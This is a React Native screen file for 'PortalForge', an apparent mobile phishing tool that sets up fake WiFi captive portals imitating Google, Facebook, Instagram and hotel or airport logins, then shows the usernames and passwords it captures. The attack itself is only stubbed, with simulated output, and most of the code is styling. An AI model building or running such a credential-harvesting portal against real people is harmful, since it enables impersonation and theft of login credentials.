import React, { useState } from 'react';
import {
  View, Text, StyleSheet, ScrollView, TouchableOpacity, TextInput,
  StatusBar, Switch, ActivityIndicator,
} from 'react-native';
import { Terminal } from '../components/Terminal';

const TEMPLATES = [
  { id: 'google', name: 'Google Login', icon: '🔵' },
  { id: 'facebook', name: 'Facebook Login', icon: '📘' },
  { id: 'instagram', name: 'Instagram Login', icon: '📷' },
  { id: 'router', name: 'WiFi Router Admin', icon: '📡' },
  { id: 'hotel', name: 'Hotel WiFi Portal', icon: '🏨' },
  { id: 'airport', name: 'Airport WiFi', icon: '✈️' },
  { id: 'custom', name: 'Custom HTML', icon: '📝' },
];

export function PortalForgeScreen({ navigation }: any) {
  const [selectedTemplate, setSelectedTemplate] = useState('google');
  const [ssid, setSsid] = useState('Free WiFi');
  const [proxyPort, setProxyPort] = useState('8080');
  const [webPort, setWebPort] = useState('8081');
  const [running, setRunning] = useState(false);
  const [output, setOutput] = useState<string[]>([]);
  const [captures, setCaptures] = useState<Array<any>>([]);
  const [transparent, setTransparent] = useState(false);

  const appendOutput = (line: string) => setOutput((prev) => [...prev, line]);

  const startPortal = async () => {
    setRunning(true);
    appendOutput('[*] Starting PortalForge...');
    appendOutput(`[*] Template: ${selectedTemplate}`);
    appendOutput(`[*] SSID: ${ssid}`);
    appendOutput(`[*] Proxy port: ${proxyPort}`);
    // Would call python bridge: executeTool('portal_forge', { template, ssid, port, ... })
    setTimeout(() => {
      appendOutput('[✓] Portal active');
      appendOutput('[*] Target must set proxy to phone IP:' + proxyPort);
    }, 2000);
  };

  const stopPortal = () => {
    setRunning(false);
    appendOutput('[*] Portal stopped');
  };

  return (
    <View style={styles.container}>
      <StatusBar barStyle="light-content" backgroundColor="#0a0a0f" />
      <View style={styles.header}>
        <TouchableOpacity onPress={() => navigation.goBack()}>
          <Text style={styles.backText}>← Back</Text>
        </TouchableOpacity>
        <Text style={styles.title}>PortalForge</Text>
        <Text style={styles.subtitle}>Captive Portal & Credential Capture</Text>
      </View>

      <ScrollView style={styles.content}>
        <View style={styles.infoBox}>
          <Text style={styles.infoText}>
            💡 Create fake WiFi login pages. Targets connecting to your hotspot see the login page.
            Credentials are captured and displayed here.
          </Text>
        </View>

        {/* Template Selection */}
        <Text style={styles.sectionLabel}>Template</Text>
        <ScrollView horizontal showsHorizontalScrollIndicator={false} style={styles.templateRow}>
          {TEMPLATES.map((t) => (
            <TouchableOpacity
              key={t.id}
              style={[styles.templateCard, selectedTemplate === t.id && styles.templateActive]}
              onPress={() => setSelectedTemplate(t.id)}
            >
              <Text style={styles.templateIcon}>{t.icon}</Text>
              <Text style={styles.templateName}>{t.name}</Text>
            </TouchableOpacity>
          ))}
        </ScrollView>

        {/* Configuration */}
        <Text style={styles.sectionLabel}>Configuration</Text>
        <View style={styles.field}>
          <Text style={styles.label}>Hotspot SSID</Text>
          <TextInput style={styles.input} value={ssid} onChangeText={setSsid} placeholderTextColor="#555" />
        </View>
        <View style={styles.field}>
          <Text style={styles.label}>Proxy Port</Text>
          <TextInput style={styles.input} value={proxyPort} onChangeText={setProxyPort} keyboardType="numeric" placeholderTextColor="#555" />
        </View>
        <View style={styles.field}>
          <Text style={styles.label}>Web UI Port</Text>
          <TextInput style={styles.input} value={webPort} onChangeText={setWebPort} keyboardType="numeric" placeholderTextColor="#555" />
        </View>

        <View style={styles.toggleRow}>
          <Text style={styles.label}>Transparent Mode (root)</Text>
          <Switch value={transparent} onValueChange={setTransparent} trackColor={{ false: '#333', true: '#4ecdc4' }} />
        </View>

        {/* Actions */}
        <View style={styles.btnRow}>
          <TouchableOpacity
            style={[styles.btn, styles.btnStart, running && styles.btnDisabled]}
            onPress={startPortal}
            disabled={running}
          >
            <Text style={styles.btnText}>{running ? '⏳ Running...' : '▶ Start Portal'}</Text>
          </TouchableOpacity>
          <TouchableOpacity style={[styles.btn, styles.btnStop]} onPress={stopPortal}>
            <Text style={styles.btnText}>⏹ Stop</Text>
          </TouchableOpacity>
        </View>

        {/* Captures */}
        {captures.length > 0 && (
          <View style={styles.captures}>
            <Text style={styles.sectionLabel}>Captured Credentials ({captures.length})</Text>
            {captures.map((c, i) => (
              <View key={i} style={styles.captureCard}>
                <Text style={styles.captureText}>User: {c.username}</Text>
                <Text style={styles.captureText}>Pass: {c.password}</Text>
                <Text style={styles.captureTime}>{c.time}</Text>
              </View>
            ))}
          </View>
        )}
      </ScrollView>

      <Terminal output={output} />
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#0a0a0f' },
  header: { paddingTop: 50, paddingHorizontal: 20, paddingBottom: 12, borderBottomWidth: 1, borderBottomColor: '#1a1a2e' },
  backText: { color: '#4ecdc4', fontSize: 14, marginBottom: 6 },
  title: { fontSize: 22, fontWeight: 'bold', color: '#fff' },
  subtitle: { fontSize: 12, color: '#888', marginTop: 2 },
  content: { flex: 1, padding: 16 },
  infoBox: { backgroundColor: '#0d2137', borderRadius: 10, padding: 12, marginBottom: 16, borderWidth: 1, borderColor: '#1a3a5c' },
  infoText: { color: '#4ecdc4', fontSize: 12, lineHeight: 18 },
  sectionLabel: { fontSize: 13, color: '#aaa', fontWeight: '700', marginTop: 16, marginBottom: 10 },
  templateRow: { flexDirection: 'row', marginBottom: 8 },
  templateCard: { padding: 12, marginRight: 10, borderRadius: 10, backgroundColor: '#12121a', borderWidth: 1, borderColor: '#2a2a3e', alignItems: 'center', minWidth: 80 },
  templateActive: { borderColor: '#4ecdc4', backgroundColor: '#0d2137' },
  templateIcon: { fontSize: 24, marginBottom: 4 },
  templateName: { fontSize: 10, color: '#ccc' },
  field: { marginBottom: 12 },
  label: { fontSize: 12, color: '#aaa', marginBottom: 6, fontWeight: '600' },
  input: { backgroundColor: '#12121a', borderWidth: 1, borderColor: '#2a2a3e', borderRadius: 10, padding: 12, color: '#fff', fontSize: 14 },
  toggleRow: { flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center', paddingVertical: 10 },
  btnRow: { flexDirection: 'row', gap: 12, marginTop: 16 },
  btn: { flex: 1, padding: 14, borderRadius: 12, alignItems: 'center' },
  btnStart: { backgroundColor: '#00b894' },
  btnStop: { backgroundColor: '#d63031' },
  btnDisabled: { opacity: 0.5 },
  btnText: { color: '#fff', fontWeight: '700', fontSize: 14 },
  captures: { marginTop: 20 },
  captureCard: { backgroundColor: '#12121a', borderRadius: 10, padding: 12, marginBottom: 8, borderWidth: 1, borderColor: '#1a3a5c' },
  captureText: { color: '#ddd', fontSize: 12, fontFamily: 'monospace' },
  captureTime: { color: '#666', fontSize: 10, marginTop: 4 },
});
